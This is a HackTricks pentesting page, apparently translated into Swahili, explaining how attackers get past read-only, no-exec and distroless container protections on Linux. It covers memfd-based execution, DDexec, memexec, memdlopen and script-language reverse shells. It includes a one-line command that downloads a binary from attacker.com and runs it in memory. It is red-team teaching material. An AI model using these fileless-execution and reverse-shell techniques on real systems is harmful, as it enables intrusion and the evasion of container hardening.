# Bypass FS protections: read-only / no-exec / Distroless

{{#include ../../../banners/hacktricks-training.md}}

## Videos

Katika video zifuatazo unaweza kupata mbinu zilizotajwa katika ukurasa huu zikielezewa kwa undani zaidi:

- [**DEF CON 31 - Exploring Linux Memory Manipulation for Stealth and Evasion**](https://www.youtube.com/watch?v=poHirez8jk4)
- [**Stealth intrusions with DDexec-ng & in-memory dlopen() - HackTricks Track 2023**](https://www.youtube.com/watch?v=VM_gjjiARaU)

## read-only / no-exec scenario

Ni kawaida zaidi na zaidi kupata mashine za linux zilizowekwa na **read-only (ro) file system protection**, hasa katika kontena. Hii ni kwa sababu kuendesha kontena na mfumo wa faili wa ro ni rahisi kama kuweka **`readOnlyRootFilesystem: true`** katika `securitycontext`:

<pre class="language-yaml"><code class="lang-yaml">apiVersion: v1
kind: Pod
metadata:
name: alpine-pod
spec:
containers:
- name: alpine
image: alpine
securityContext:
<strong>      readOnlyRootFilesystem: true
</strong>    command: ["sh", "-c", "while true; do sleep 1000; done"]
</code></pre>

Hata hivyo, hata kama mfumo wa faili umewekwa kama ro, **`/dev/shm`** bado itaandikwa, hivyo ni uongo hatuwezi kuandika chochote kwenye diski. Hata hivyo, folda hii itakuwa **imewekwa na no-exec protection**, hivyo ikiwa utashusha binary hapa huwezi **kuweza kuitekeleza**.

> [!WARNING]
> Kutoka kwa mtazamo wa timu nyekundu, hii inafanya **kuwa ngumu kupakua na kutekeleza** binaries ambazo hazipo kwenye mfumo tayari (kama backdoors au enumerators kama `kubectl`).

## Easiest bypass: Scripts

Kumbuka kwamba nilitaja binaries, unaweza **kutekeleza script yoyote** mradi tu mfasiri yuko ndani ya mashine, kama **shell script** ikiwa `sh` inapatikana au **python** **script** ikiwa `python` imewekwa.

Hata hivyo, hii haitoshi kutekeleza backdoor yako ya binary au zana nyingine za binary unazoweza kuhitaji kuendesha.

## Memory Bypasses

Ikiwa unataka kutekeleza binary lakini mfumo wa faili haukuruhusu hilo, njia bora ya kufanya hivyo ni kwa **kuitekeleza kutoka kwenye kumbukumbu**, kwani **ulinzi hauwezi kutumika huko**.

### FD + exec syscall bypass

Ikiwa una injini za script zenye nguvu ndani ya mashine, kama **Python**, **Perl**, au **Ruby** unaweza kupakua binary ili kuitekeleza kutoka kwenye kumbukumbu, kuihifadhi katika file descriptor ya kumbukumbu (`create_memfd` syscall), ambayo haitalindwa na ulinzi huo na kisha kuita **`exec` syscall** ikionyesha **fd kama faili ya kutekeleza**.

Kwa hili unaweza kwa urahisi kutumia mradi [**fileless-elf-exec**](https://github.com/nnsee/fileless-elf-exec). Unaweza kupitisha binary na itaunda script katika lugha iliyoonyeshwa na **binary iliyoshinikizwa na b64 encoded** pamoja na maagizo ya **kufungua na kubana** katika **fd** iliyoundwa kwa kuita `create_memfd` syscall na wito kwa **exec** syscall kuikimbia.

> [!WARNING]
> Hii haifanyi kazi katika lugha nyingine za skripti kama PHP au Node kwa sababu hazina njia yoyote ya **kawaida ya kuita raw syscalls** kutoka kwa script, hivyo haiwezekani kuita `create_memfd` kuunda **memory fd** kuhifadhi binary.
>
> Zaidi ya hayo, kuunda **regular fd** na faili katika `/dev/shm` hakutafanya kazi, kwani hutaruhusiwa kuikimbia kwa sababu **no-exec protection** itatumika.

### DDexec / EverythingExec

[**DDexec / EverythingExec**](https://github.com/arget13/DDexec) ni mbinu inayokuruhusu **kudhibiti kumbukumbu ya mchakato wako mwenyewe** kwa kuandika tena **`/proc/self/mem`**.

Hivyo, **kudhibiti msimbo wa mkusanyiko** unaotekelezwa na mchakato, unaweza kuandika **shellcode** na "kubadilisha" mchakato ili **kutekeleza msimbo wowote wa kawaida**.

> [!TIP]
> **DDexec / EverythingExec** itakuruhusu kupakia na **kutekeleza** **shellcode** yako mwenyewe au **binary yoyote** kutoka **kumbukumbu**.
```bash
# Basic example
wget -O- https://attacker.com/binary.elf | base64 -w0 | bash ddexec.sh argv0 foo bar
```
Kwa maelezo zaidi kuhusu mbinu hii angalia Github au:

{{#ref}}
ddexec.md
{{#endref}}

### MemExec

[**Memexec**](https://github.com/arget13/memexec) ni hatua ya asili inayofuata ya DDexec. Ni **DDexec shellcode demonised**, hivyo kila wakati unapotaka **kuendesha binary tofauti** huwezi kuanzisha tena DDexec, unaweza tu kuendesha memexec shellcode kupitia mbinu ya DDexec na kisha **kuwasiliana na demon hii ili kupitisha binaries mpya za kupakia na kuendesha**.

Unaweza kupata mfano wa jinsi ya kutumia **memexec kutekeleza binaries kutoka kwa PHP reverse shell** katika [https://github.com/arget13/memexec/blob/main/a.php](https://github.com/arget13/memexec/blob/main/a.php).

### Memdlopen

Kwa kusudi sawa na DDexec, [**memdlopen**](https://github.com/arget13/memdlopen) mbinu inaruhusu **njia rahisi ya kupakia binaries** kwenye kumbukumbu ili baadaye kuziendesha. Inaweza hata kuruhusu kupakia binaries zenye utegemezi.

## Distroless Bypass

### Nini maana ya distroless

Kontena za distroless zina vitu tu **vya msingi vinavyohitajika kuendesha programu au huduma maalum**, kama maktaba na utegemezi wa wakati wa kuendesha, lakini zinatenga vitu vikubwa kama meneja wa pakiti, shell, au zana za mfumo.

Lengo la kontena za distroless ni **kupunguza uso wa shambulio wa kontena kwa kuondoa vitu visivyohitajika** na kupunguza idadi ya udhaifu ambao unaweza kutumiwa.

### Reverse Shell

Katika kontena ya distroless huenda **usipate hata `sh` au `bash`** kupata shell ya kawaida. Hutaweza pia kupata binaries kama `ls`, `whoami`, `id`... kila kitu ambacho kawaida unakimbia kwenye mfumo.

> [!WARNING]
> Kwa hivyo, huwezi kupata **reverse shell** au **kuhesabu** mfumo kama kawaida unavyofanya.

Hata hivyo, ikiwa kontena iliyoathirika inakimbia kwa mfano flask web, basi python imewekwa, na hivyo unaweza kupata **Python reverse shell**. Ikiwa inakimbia node, unaweza kupata Node rev shell, na vivyo hivyo na lugha nyingi za **scripting**.

> [!TIP]
> Kwa kutumia lugha ya scripting unaweza **kuhesabu mfumo** kwa kutumia uwezo wa lugha hiyo.

Ikiwa hakuna **`read-only/no-exec`** ulinzi unaweza kutumia reverse shell yako **kuandika kwenye mfumo wa faili binaries zako** na **kuziendesha**.

> [!TIP]
> Hata hivyo, katika aina hii ya kontena ulinzi huu kwa kawaida utakuwepo, lakini unaweza kutumia **mbinu za awali za utekelezaji wa kumbukumbu kuzipita**.

Unaweza kupata **mfano** wa jinsi ya **kutumia udhaifu fulani wa RCE** kupata lugha za scripting **reverse shells** na kuendesha binaries kutoka kwa kumbukumbu katika [**https://github.com/carlospolop/DistrolessRCE**](https://github.com/carlospolop/DistrolessRCE).


{{#include ../../../banners/hacktricks-training.md}}
